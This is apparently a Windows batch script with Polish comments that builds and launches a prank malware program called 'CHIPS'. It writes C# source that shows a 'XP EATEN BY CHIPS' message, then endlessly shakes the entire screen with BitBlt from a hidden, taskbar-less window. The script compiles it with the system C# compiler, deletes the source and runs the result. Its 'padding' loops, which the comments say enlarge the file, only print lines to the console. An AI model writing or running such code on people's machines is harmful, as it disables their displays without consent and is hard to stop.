@echo off
title CHIPS XP - MEGA EDITION
color 0c

:: --- DEKORACJA (To bedzie sie powtarzac w nieskonczonosc) ---
echo [*] PREPARING CHIPS...
echo [*] SCANNING SYSTEM...
echo [*] LOADING PAYLOAD...

:: Tutaj zaczyna sie "sciana tekstu" - ttttt ttttt ttttt
:: Symulujemy ogromny plik, piszac tysiace linii komentarzy
for /L %%i in (1,1,5000) do (
    echo :: ttttt ttttt ttttt ttttt ttttt ttttt ttttt ttttt ttttt ttttt
)

:: --- TUTAJ ZACZYNA SIE WLASCIWY KOD ---
set "csc="
for /r C:\Windows\Microsoft.NET\Framework %%f in (csc.exe) do set "csc=%%f"

if not defined csc (
    echo [!] ERROR: .NET NOT FOUND.
    pause
    exit
)

:: PISZEMY KOD C# (Pionowo, linijka po linijce)
echo using System; > c.cs
echo using System.Drawing; >> c.cs
echo using System.Windows.Forms; >> c.cs
echo using System.Runtime.InteropServices; >> c.cs
echo using System.Threading; >> c.cs
echo namespace CHIPS { >> c.cs
echo   class Program { >> c.cs
echo     [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h); >> c.cs
echo     [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr d,int x,int y,int w,int h,IntPtr s,int sx,int sy,uint r); >> c.cs
echo     [DllImport("user32.dll")] static extern int GetSystemMetrics(int n); >> c.cs
echo     static void Main() { >> c.cs
echo       MessageBox.Show("XP EATEN BY CHIPS", "CHIPS", 0, (MessageBoxIcon)48); >> c.cs
echo       new Thread(delegate() { >> c.cs
echo         IntPtr hdc = GetDC(IntPtr.Zero); >> c.cs
echo         int w = GetSystemMetrics(0), h = GetSystemMetrics(1); >> c.cs
echo         Random r = new Random(); >> c.cs
echo         while(true) { >> c.cs
echo           BitBlt(hdc, r.Next(-15,16), r.Next(-15,16), w, h, hdc, 0, 0, 0x00CC0020); >> c.cs
echo           Thread.Sleep(5); >> c.cs
echo         } >> c.cs
echo       }).Start(); >> c.cs
echo       Application.Run(new Form { Opacity = 0, ShowInTaskbar = false }); >> c.cs
echo     } >> c.cs
echo   } >> c.cs
echo } >> c.cs

:: Kolejna porcja "smieci", zeby plik byl ciezki
for /L %%i in (1,1,5000) do (
    echo :: ttttt ttttt ttttt ttttt ttttt ttttt ttttt ttttt ttttt ttttt
)

:: --- KOMPILACJA ---
"%csc%" /target:winexe /out:CHIPS_ULTRA.exe /r:System.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll c.cs > nul

:: --- FINAL ---
if exist CHIPS_ULTRA.exe (
    del c.cs
    cls
    echo =========================================
    echo   CHIPS XP ENGINE: DEPLOYED
    echo =========================================
    start CHIPS_ULTRA.exe
) else (
    echo [!] FAILED TO BAKE CHIPS.
    del c.cs
)
pause
